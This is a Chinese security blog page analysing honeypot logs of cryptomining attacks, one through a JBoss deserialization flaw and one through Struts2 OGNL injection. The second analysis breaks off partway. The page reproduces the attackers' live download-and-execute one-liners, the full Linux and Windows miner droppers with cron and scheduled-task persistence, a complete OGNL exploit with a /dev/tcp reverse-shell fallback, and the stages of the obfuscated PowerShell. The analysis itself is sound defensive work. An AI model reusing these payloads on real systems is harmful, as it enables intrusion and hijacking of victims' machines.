(Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class=<span class="string">"org"</span>.jboss.invocation.MarshalledValue] 0.003 1049</div></pre></td></tr></table></figure>
<p>这几条日志访问的都是 /invoker/JMXInvokerServlet ，这个路径是涉及到的漏洞是 JBoss JMXInvokerServlet 反序列化漏洞， 发送包含恶意序列化对象的请求，导致远程代码执行，从里面看到相关的信息，关键的有两条：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -c &#123;<span class="built_in">echo</span>,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</div></pre></td></tr></table></figure>
<p>解码后：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl 45.123.190.178/lin.txt | sh</div></pre></td></tr></table></figure>
<p>和第一条日志的执行内容是一样的</p>
<p>第二部分</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell.exe -nop -c <span class="string">"iex(New-Object Net.WebClient).DownloadString('http://45.123.190.178/win.txt')"</span></div></pre></td></tr></table></figure>
<p>可以看到都是与<strong>45.123.190.178</strong>进行通信，分别下载了linux和windows环境下的脚本，下面来看一下这两个脚本:</p>
<h3 id="lin-txt"><a href="#lin-txt" class="headerlink" title="lin.txt"></a><strong>lin.txt</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/usr/sbin</div><div class="line">days=$(($(date +%s) / 60 / 60 / 24))</div><div class="line"><span class="function"><span class="title">DoMine</span></span>()</div><div class="line">&#123;</div><div class="line">rm -rf /tmp/Silence*</div><div class="line">ps -ef|grep Silence |grep -v grep</div><div class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></div><div class="line"><span class="keyword">if</span> [ -x /usr/bin/wget ] ; <span class="keyword">then</span></div><div class="line"><span class="keyword">elif</span> [ -x /usr/bin/curl ] ; <span class="keyword">then</span></div><div class="line">wget -q http://45.123.190.178/Silence -O /tmp/Silence</div><div class="line">curl -o /tmp/Silence http://45.123.190.178/Silence</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">exit</span> 0;</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /tmp/Silence</div><div class="line">nohup /tmp/Silence -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44pgg5mYVH6Gnc7gKfWGPR2CxfQLhwdrCPJGzLonwrSt5CKSeEy6izyjEnRn114HTU7AWFTp1SMZ6eqQfvrdeGWzUdrADDu -p x -R 1 &amp;&gt;&gt;/dev/null &amp;</div><div class="line">sleep 10</div><div class="line">rm -rf /tmp/Silence</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ -x /usr/bin/wget ] ; <span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> <span class="string">'*/15 * * * * wget -q http://45.123.190.178/lin.txt -O - |sh'</span> &gt; /tmp/.cron</div><div class="line"><span class="keyword">elif</span> [ -x /usr/bin/curl ] ; <span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> <span class="string">'*/15 * * * * curl http://45.123.190.178/lin.txt |sh'</span> &gt; /tmp/.cron</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">exit</span> 0;</div><div class="line"><span class="keyword">fi</span></div><div class="line">crontab -r</div><div class="line">crontab /tmp/.cron</div><div class="line">sleep 3</div><div class="line">rm /tmp/.cron</div><div class="line"><span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">ps auxf|grep -v grep|grep <span class="string">"42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="variable">$&#123;days&#125;</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"logind.conf"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"cryptonight"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"kworker"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"45hsTaSqTQM4K1Xeqkcy7eLzqdEuQ594fJVmQryCemQSCU878JGQdSDCxbhNyVjSkiaYat8yAfBuRTPSEUPZoARm9a5XEHZ"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"47sghzufGhJJDQEbScMCwVBimTuq6L5JiRixD8VeGbpjCTA12noXmi4ZyBZLc99e66NtnKff34fHsGRoyZk3ES1s1V4QVcB"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"44iuYecTjbVZ1QNwjWfJSZFCKMdceTEP5BBNp4qP35c53Uohu1G7tDmShX1TSmgeJr2e9mCw2q1oHHTC2boHfjkJMzdxumM"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">pkill -f 49hNrEaSKAx5FD8PE49Wa3DqCRp2ELYg8dSuqsiyLdzSehFfyvk4gDfSjTrPtGapqcfPVvMtAirgDJYMvbRJipaeTbzPQu4</div><div class="line">pkill -f 4AniF816tMCNedhQ4J3ccJayyL5ZvgnqQ4X9bK7qv4ZG3QmUfB9tkHk7HyEhh5HW6hCMSw5vtMkj6jSYcuhQTAR1Sbo15gB</div><div class="line">pkill -f 4813za7ePRV5TBce3NrSrugPPJTMFJmEMR9qiWn2Sx49JiZE14AmgRDXtvM1VFhqwG99Kcs9TfgzejAzT9Spm5ga5dkh8df</div><div class="line">pkill -f cpuloadtest</div><div class="line">pkill -f crypto-pool</div><div class="line">pkill -f xmr</div><div class="line">pkill -f prohash</div><div class="line">pkill -f monero</div><div class="line">pkill -f miner</div><div class="line">pkill -f nanopool</div><div class="line">pkill -f minergate</div><div class="line">pkill -f yam</div><div class="line">pkill -f yam2</div><div class="line">pkill -f minerd</div><div class="line">pkill -f Circle_MI.png</div><div class="line">pkill -f curl</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"mine.moneropool.com"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"crypto-pool"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"prohash"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"monero"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"miner"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"nanopool"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"minergate"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr:8080"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr:3333"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr:443"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"zhuabcn@yahoo.com"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"stratum"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"49JsSwt7MsH5m8DPRHXFSEit9ZTWZCbWwS7QSMUTcVuCgwAU24gni1ydnHdrT9QMibLtZ3spC7PjmEyUSypnmtAG7pyys7F"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"479MD1Emw69idbVNKPtigbej7x1ZwFR1G3boyXUFfAB89uk2AztaMdWVd6NzCTfZVpDReKEAsVVBwYpTG8fsRK3X17jcDKm"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"11231"</span> || DoMine</div></pre></td></tr></table></figure>
<p>脚本从<strong>45.123.190.178</strong>下载<strong>Silence</strong>样本进行挖矿(门罗币)，并且创建了定时任务每15分钟运行一次确保程序能够一直运行，后面则是清除一些残余进程</p>
<h3 id="win-txt"><a href="#win-txt" class="headerlink" title="win.txt"></a><strong>win.txt</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$murl</span> = <span class="string">"http://45.123.190.178/Silences.exe"</span></div><div class="line"><span class="variable">$moutput</span> = <span class="string">"<span class="variable">$env</span>:TMP\yammsb.exe"</span></div><div class="line"><span class="variable">$wc</span> = New-Object System.Net.WebClient</div><div class="line"><span class="variable">$wc</span>.DownloadFile(<span class="variable">$murl</span>, <span class="variable">$moutput</span>)</div><div class="line">cmd.exe /c <span class="variable">$env</span>:TMP\yammsb.exe</div><div class="line">SchTasks.exe /Create /SC MINUTE /TN <span class="string">"UpdateGG"</span> /TR <span class="string">"PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noexit -File <span class="variable">$env</span>:TMP\SchTask.ps1"</span> /MO 6 /F</div><div class="line"></div><div class="line"><span class="keyword">while</span> (<span class="variable">$true</span>) &#123;</div><div class="line"><span class="keyword">if</span>(!(Get-Process Carbon -ErrorAction SilentlyContinue)) &#123;</div><div class="line"><span class="built_in">echo</span> <span class="string">"Not running"</span></div><div class="line">cmd.exe /C <span class="variable">$env</span>:TMP\run.bat</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">echo</span> <span class="string">"Running"</span></div><div class="line">&#125;</div><div class="line">Start-Sleep 55</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>相应地，Windows下则是调用powershell下载，通信地址还是<strong>45.123.190.178</strong>，下载的是<strong>Silences.exe</strong>样本</p>
<p>脚本里还有三个文件: <strong>yammsb.exe  SchTask.ps1  run.bat</strong></p>
<p>跑了一下Silences.exe文件后产生了 <strong>SchTask.ps1 run.bat</strong> 两个文件，<strong>yammsb.exe</strong>暂不知道是什么，其中<strong>SchTask.ps1</strong>的内容就是上面win.txt内容，<strong>run.bat</strong>则配置了矿池的地址:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">taskkill /f /im Carbon.exe</div><div class="line">%temp%/Silence.exe -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44pgg5mYVH6Gnc7gKfWGPR2CxfQLhwdrCPJGzLonwrSt5CKSeEy6izyjEnRn114HTU7AWFTp1SMZ6eqQfvrdeGWzUdrADDu -p x --donate-level=1 -t 4</div></pre></td></tr></table></figure>
<p>里面的Carbon.exe可能与<a href="https://virus-removal-guide.net/zh/9199-carbon-exe-slowly-kills-cpu-carbon-exe-remedy/" target="_blank" rel="external">这篇文章</a>提到的有关，也是跟数字货币相关的恶意程序</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\16-32-3.png" alt="16-32-3"></p>
<p>在微步在线上也出现了相关的情报，<a href="https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=287" target="_blank" rel="external">https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=287</a>，第一次发现是在1月5号，涉及到的脚本和蜜罐上看到的是一样的:</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这次事件利用了多个java反序列化漏洞来执行恶意行为，其中不乏最近爆出的Weblogic漏洞，这几个漏洞的显著特点就是可以远程执行代码，对黑产来说是最为简单有效的利用方式，而数字货币价格的不断攀升也更加助长了层出不穷的挖矿行为。</p>
<p>相关的脚本和样本见附件，两个样本已经上传puma简单分析，对应链接</p>
<p> <a href="https://poma.nsfocus.com/report?md5=483b322b42835227d98f523f9df5c6fc" target="_blank" rel="external">https://poma.nsfocus.com/report?md5=483b322b42835227d98f523f9df5c6fc</a></p>
<p> <a href="https://poma.nsfocus.com/report?md5=e8e00e6490c1b1f07dc3d6d51fcc0d6d" target="_blank" rel="external">https://poma.nsfocus.com/report?md5=e8e00e6490c1b1f07dc3d6d51fcc0d6d</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/01/10/利用java反序列化漏洞植入门罗币挖矿程序事件分析/" data-id="cjca1zrwm000k881bhjfpwfmq" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-powershell植入mule挖矿程序事件分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/10/powershell植入mule挖矿程序事件分析/" class="article-date">
  <time datetime="2018-01-10T12:24:56.000Z" itemprop="datePublished">2018-01-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/10/powershell植入mule挖矿程序事件分析/">powershell植入mule挖矿程序事件分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>近期看到的一条日志内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">173.212.217.181 - - [20/Oct/2017:16:54:11 +0000] <span class="string">"GET / HTTP/1.1"</span> [] 200 - [-] [%&#123;(<span class="comment">#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#wcmd="C:\\\"Windows\\\"System32\\\"WindowsPowerShell\\\"v1.0\\\"powershell.exe -WindowStyle Hidden -encode JABlAD0AJwBLAEEAQQB1AEEAQwBnAEEASQBnAEIANwBBAEQAQQBBAGYAUQBCADcAQQBEAEUAQQBmAFEAQgA3AEEARABJAEEAZgBRAEEAaQBBAEMAMABBAFoAZwBBAG4AQQBFADQAQQBKAHcAQQBzAEEAQwBnAEEASQBnAEIANwBBAEQARQBBAGYAUQBCADcAQQBEAEEAQQBmAFEAQQBpAEEAQwAwAEEAWgBnAEEAbgBBAEgAYwBBAEwAUQBCAFAAQQBHAEkAQQBKAHcAQQBzAEEAQwBjAEEAWgBRAEEAbgBBAEMAawBBAEwAQQBBAG8AQQBDAEkAQQBlAHcAQQB3AEEASAAwAEEAZQB3AEEAeABBAEgAMABBAEkAZwBBAHQAQQBHAFkAQQBJAEEAQQBuAEEARwBvAEEAWgBRAEEAbgBBAEMAdwBBAEoAdwBCAGoAQQBIAFEAQQBKAHcAQQBwAEEAQwBrAEEASQBBAEEAbwBBAEMASQBBAGUAdwBBADAAQQBIADAAQQBlAHcAQQB6AEEASAAwAEEAZQB3AEEAeQBBAEgAMABBAGUAdwBBAHgAQQBIADAAQQBlAHcAQQB3AEEASAAwAEEASQBnAEEAZwBBAEMAMABBAFoAZwBBAGcAQQBDAGMAQQBkAEEAQQBuAEEAQwB3AEEASwBBAEEAaQBBAEgAcwBBAE0AUQBCADkAQQBIAHMAQQBNAEEAQgA5AEEAQwBJAEEASQBBAEEAdABBAEcAWQBBAEoAdwBCAGwAQQBHADQAQQBKAHcAQQBzAEEAQwBjAEEAUQB3AEIAcwBBAEcAawBBAEoAdwBBAHAAQQBDAHcAQQBKAHcAQgBYAEEARwBVAEEAWQBnAEEAbgBBAEMAdwBBAEoAdwBCAGwAQQBIAFEAQQBMAGcAQQBuAEEAQwB3AEEASwBBAEEAaQBBAEgAcwBBAE0AUQBCADkAQQBIAHMAQQBNAEEAQgA5AEEASABzAEEATQBnAEIAOQBBAEMASQBBAEkAQQBBAHQAQQBHAFkAQQBKAHcAQgAwAEEARwBVAEEAYgBRAEEAdQBBAEMAYwBBAEwAQQBBAG4AQQBGAE0AQQBlAFEAQgB6AEEAQwBjAEEATABBAEEAbgBBAEUANABBAEoAdwBBAHAAQQBDAGsAQQBLAFEAQQB1AEEAQwBnAEEASQBnAEIANwBBAEQAQQBBAGYAUQBCADcAQQBEAEUAQQBmAFEAQgA3AEEARABNAEEAZgBRAEIANwBBAEQASQBBAGYAUQBBAGkAQQBDAEEAQQBMAFEAQgBtAEEAQwBjAEEAUgBBAEEAbgBBAEMAdwBBAEsAQQBBAGkAQQBIAHMAQQBNAFEAQgA5AEEASABzAEEATQBnAEIAOQBBAEgAcwBBAE0AQQBCADkAQQBDAEkAQQBMAFEAQgBtAEEAQwBBAEEASgB3AEIAaABBAEcAUQBBAFUAdwBCADAAQQBDAGMAQQBMAEEAQQBuAEEARwA4AEEAZAB3AEEAbgBBAEMAdwBBAEoAdwBCAHUAQQBHAHcAQQBiAHcAQQBuAEEAQwBrAEEATABBAEEAbgBBAEcANABBAFoAdwBBAG4AQQBDAHcAQQBKAHcAQgB5AEEARwBrAEEASgB3AEEAcABBAEMANABBAEkAZwBCAHAAQQBFADQAQQBWAGcAQgBnAEEARwA4AEEAWQBBAEIATABBAEcAVQBBAEkAZwBBAG8AQQBDAGcAQQBJAGcAQgA3AEEARABJAEEAZgBRAEIANwBBAEQARQBBAGYAUQBCADcAQQBEAE0AQQBmAFEAQgA3AEEARABVAEEAZgBRAEIANwBBAEQAQQBBAGYAUQBCADcAQQBEAFkAQQBmAFEAQgA3AEEARABRAEEAZgBRAEEAaQBBAEMAMABBAFoAZwBBAG8AQQBDAEkAQQBlAHcAQQB3AEEASAAwAEEAZQB3AEEAeABBAEgAMABBAEkAZwBBAGcAQQBDADAAQQBaAGcAQQBnAEEAQwBjAEEAYgBnAEEAdgBBAEMAYwBBAEwAQQBBAG4AQQBIAE0AQQBZAHcAQQBuAEEAQwBrAEEATABBAEEAbgBBAEgAUQBBAGQAQQBBAG4AQQBDAHcAQQBKAHcAQgBvAEEAQwBjAEEATABBAEEAbwBBAEMASQBBAGUAdwBBAHgAQQBIADAAQQBlAHcAQQB3AEEASAAwAEEASQBnAEEAZwBBAEMAMABBAFoAZwBBAGcAQQBDAGMAQQBMAHcAQgBoAEEAQwBjAEEATABBAEEAbgBBAEgAQQBBAE8AZwBBAHYAQQBDAGMAQQBLAFEAQQBzAEEAQwBjAEEATQBRAEEAbgBBAEMAdwBBAEsAQQBBAGkAQQBIAHMAQQBNAEEAQgA5AEEASABzAEEATQBnAEIAOQBBAEgAcwBBAE0AUQBCADkAQQBDAEkAQQBMAFEAQgBtAEEAQwBBAEEASgB3AEIAcABBAEgAUQBBAEoAdwBBAHMAQQBDAGMAQQBaAFEAQQB1AEEASABjAEEAYQBRAEEAbgBBAEMAdwBBAEoAdwBBADMAQQBHAFUAQQBKAHcAQQBwAEEAQwB3AEEASwBBAEEAaQBBAEgAcwBBAE0AQQBCADkAQQBIAHMAQQBNAFEAQgA5AEEAQwBJAEEASQBBAEEAdABBAEcAWQBBAEkAQQBBAG4AQQBIAFkAQQBMAGcAQgB3AEEAQwBjAEEATABBAEEAbgBBAEgATQBBAEoAdwBBAHAAQQBDAGsAQQBLAFEAQgA4AEEAQwA0AEEASwBBAEEAaQBBAEgAcwBBAE0AQQBCADkAQQBIAHMAQQBNAFEAQgA5AEEAQwBJAEEATABRAEIAbQBBAEMAQQBBAEoAdwBCAHAAQQBHAFUAQQBKAHcAQQBzAEEAQwBjAEEAZQBBAEEAbgBBAEMAawBBACcAOwAgAHMAdABhAHIAdAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgACcALQBlAG4AYwBvAGQAZQAnACwAIAAkAGUA").(#lcmd="nohup sh -c '(sh &lt; /dev/tcp/149.255.35.91/23546 &gt; /dev/null || curl -s http://149.255.35.91/larva.sh|sh &gt; /dev/null || wget http://149.255.35.91/larva.sh -O /var/tmp/larva.sh) &amp;&amp; chmod +x /var/tmp/larva.sh &amp;&amp; (nohup /var/tmp/larva.sh &amp;) &amp;&amp; sleep 1 &amp;&amp; rm -f /var/tmp/larva.sh' &amp;").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?&#123;"cmd.exe","/c",#wcmd&#125;:&#123;"/bin/bash","-c",#lcmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.write(" ok5026 ".getBytes())).(#ros.flush())&#125;] 0.448 220</span></div></pre></td></tr></table></figure>
<p>关键部分时一段编码后的powershell命令，base解码之后得到：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$e</span>=<span class="string">'KAAuACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiAC0AZgAnAE4AJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAHcALQBPAGIAJwAsACcAZQAnACkALAAoACIAewAwAH0AewAxAH0AIgAtAGYAIAAnAGoAZQAnACwAJwBjAHQAJwApACkAIAAoACIAewA0AH0AewAzAH0AewAyAH0AewAxAH0AewAwAH0AIgAgAC0AZgAgACcAdAAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAJwBlAG4AJwAsACcAQwBsAGkAJwApACwAJwBXAGUAYgAnACwAJwBlAHQALgAnACwAKAAiAHsAMQB9AHsAMAB9AHsAMgB9ACIAIAAtAGYAJwB0AGUAbQAuACcALAAnAFMAeQBzACcALAAnAE4AJwApACkAKQAuACgAIgB7ADAAfQB7ADEAfQB7ADMAfQB7ADIAfQAiACAALQBmACcARAAnACwAKAAiAHsAMQB9AHsAMgB9AHsAMAB9ACIALQBmACAAJwBhAGQAUwB0ACcALAAnAG8AdwAnACwAJwBuAGwAbwAnACkALAAnAG4AZwAnACwAJwByAGkAJwApAC4AIgBpAE4AVgBgAG8AYABLAGUAIgAoACgAIgB7ADIAfQB7ADEAfQB7ADMAfQB7ADUAfQB7ADAAfQB7ADYAfQB7ADQAfQAiAC0AZgAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAgACcAbgAvACcALAAnAHMAYwAnACkALAAnAHQAdAAnACwAJwBoACcALAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAgACcALwBhACcALAAnAHAAOgAvACcAKQAsACcAMQAnACwAKAAiAHsAMAB9AHsAMgB9AHsAMQB9ACIALQBmACAAJwBpAHQAJwAsACcAZQAuAHcAaQAnACwAJwA3AGUAJwApACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAIAAnAHYALgBwACcALAAnAHMAJwApACkAKQB8AC4AKAAiAHsAMAB9AHsAMQB9ACIALQBmACAAJwBpAGUAJwAsACcAeAAnACkA'</span>; start C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden <span class="string">'-encode'</span>, <span class="variable">$e</span></div></pre></td></tr></table></figure>
<p>其中变量e再次进行了编码，于是再解码一次：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(.(<span class="string">"&#123;0&#125;&#123;1&#125;&#123;2&#125;"</span>-f<span class="string">'N'</span>,(<span class="string">"&#123;1&#125;&#123;0&#125;"</span>-f<span class="string">'w-Ob'</span>,<span class="string">'e'</span>),(<span class="string">"&#123;0&#125;&#123;1&#125;"</span>-f <span class="string">'je'</span>,<span class="string">'ct'</span>)) (<span class="string">"&#123;4&#125;&#123;3&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;"</span> -f <span class="string">'t'</span>,(<span class="string">"&#123;1&#125;&#123;0&#125;"</span> -f<span class="string">'en'</span>,<span class="string">'Cli'</span>),<span class="string">'Web'</span>,<span class="string">'et.'</span>,(<span class="string">"&#123;1&#125;&#123;0&#125;&#123;2&#125;"</span> -f<span class="string">'tem.'</span>,<span class="string">'Sys'</span>,<span class="string">'N'</span>))).(<span class="string">"&#123;0&#125;&#123;1&#125;&#123;3&#125;&#123;2&#125;"</span> -f<span class="string">'D'</span>,(<span class="string">"&#123;1&#125;&#123;2&#125;&#123;0&#125;"</span>-f <span class="string">'adSt'</span>,<span class="string">'ow'</span>,<span class="string">'nlo'</span>),<span class="string">'ng'</span>,<span class="string">'ri'</span>).<span class="string">"iNV`o`Ke"</span>((<span class="string">"&#123;2&#125;&#123;1&#125;&#123;3&#125;&#123;5&#125;&#123;0&#125;&#123;6&#125;&#123;4&#125;"</span>-f(<span class="string">"&#123;0&#125;&#123;1&#125;"</span> -f <span class="string">'n/'</span>,<span class="string">'sc'</span>),<span class="string">'tt'</span>,<span class="string">'h'</span>,(<span class="string">"&#123;1&#125;&#123;0&#125;"</span> -f <span class="string">'/a'</span>,<span class="string">'p:/'</span>),<span class="string">'1'</span>,(<span class="string">"&#123;0&#125;&#123;2&#125;&#123;1&#125;"</span>-f <span class="string">'it'</span>,<span class="string">'e.wi'</span>,<span class="string">'7e'</span>),(<span class="string">"&#123;0&#125;&#123;1&#125;"</span> -f <span class="string">'v.p'</span>,<span class="string">'s'</span>)))|.(<span class="string">"&#123;0&#125;&#123;1&#125;"</span>-f <span class="string">'ie'</span>,<span class="string">'x'</span>)</div></pre></td></tr></table></figure>
<p>可读性还是很差，经过判断这应该对字符进行了换位操作，打乱了顺序逃避检测，于是把字符进行重新组合，得到了这样一条命令:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iex (New-Object SystemNet.WebClient).DownloadString(<span class="string">'http://ait7ee.win/scv.ps1'</span>)</div></pre></td></tr></table></figure>
<p>所以一开始的命令经过两次解码和一次字符换位后完整命令如下:</p>
